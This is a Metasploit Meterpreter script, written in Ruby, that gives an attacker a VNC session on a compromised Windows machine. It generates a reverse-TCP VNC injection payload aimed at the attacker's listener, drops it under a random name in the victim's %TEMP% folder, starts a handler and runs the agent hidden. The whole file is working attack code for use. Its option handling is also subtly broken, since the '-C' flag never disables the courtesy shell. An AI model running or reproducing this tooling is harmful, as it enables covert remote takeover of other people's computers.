# $Id$

#
# Meterpreter script for obtaining a quick VNC session
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4545)"],
	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
	"-C"  => [ false,  "Disable the VNC courtesy shell"]
)

#
# Default parameters
#

rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4545
autoconn = true
courtesy = true

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		return
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	when "-D"
		autoconn = false
	when "-C"
		courtesy = true
	end
end

#
# Create the agent EXE
#
print_status("Creating a VNC stager: LHOST=#{rhost} LPORT=#{rport})")
pay = client.framework.payloads.create("windows/vncinject/reverse_tcp")
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
raw  = pay.generate

exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
print_status("VNC stager executable #{exe.length} bytes long")


#
# Upload to the filesystem
#

tempdir = client.fs.file.expand_path("%TEMP%")
tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
tempexe.gsub!("\\\\", "\\")

fd = client.fs.file.new(tempexe, "wb")
fd.write(exe)
fd.close

print_status("Uploaded the VNC agent to #{tempexe} (must be deleted manually)")

#
# Setup the multi/handler if requested
#

if(autoconn)
	mul = client.framework.exploits.create("multi/handler")
	mul.datastore['PAYLOAD']   = "windows/vncinject/reverse_tcp"
	mul.datastore['LHOST']     = rhost
	mul.datastore['LPORT']     = rport
	mul.datastore['EXITFUNC']  = 'process'
	mul.datastore['ExitOnSession'] = true
	if (courtesy)
		mul.datastore['DisableCourtesyShell'] = true
	end
	mul.exploit_simple(
		'Payload'        => mul.datastore['PAYLOAD'],
		'RunAsJob'       => true
	)
end

#
# Execute the agent
#
print_status("Executing the VNC agent with endpoint #{rhost}:#{rport}...")
proc = session.sys.process.execute(tempexe, nil, {'Hidden' => true})